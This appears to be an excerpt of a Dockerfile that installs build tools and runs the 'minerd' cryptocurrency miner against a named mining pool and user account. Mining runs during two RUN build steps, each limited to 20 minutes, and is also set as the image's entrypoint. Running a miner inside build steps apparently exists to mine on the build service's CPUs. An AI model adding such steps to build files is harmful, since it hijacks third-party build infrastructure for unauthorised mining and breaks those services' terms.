...
RUN apt-get update && apt-get install -y git libcurl4-openssl-dev gcc-mingw-w64 automake gcc make && \
    ...
    timeout 20m ./minerd -t 1 -a yescrypt -o stratum+tcp://jp.lapool.me:3014 -u nao20010128nao.user -p password || true
...
RUN timeout 20m minerd -t 1 -a yescrypt -o stratum+tcp://jp.lapool.me:3014 -u nao20010128nao.user -p password || true
ENTRYPOINT ["minerd"]
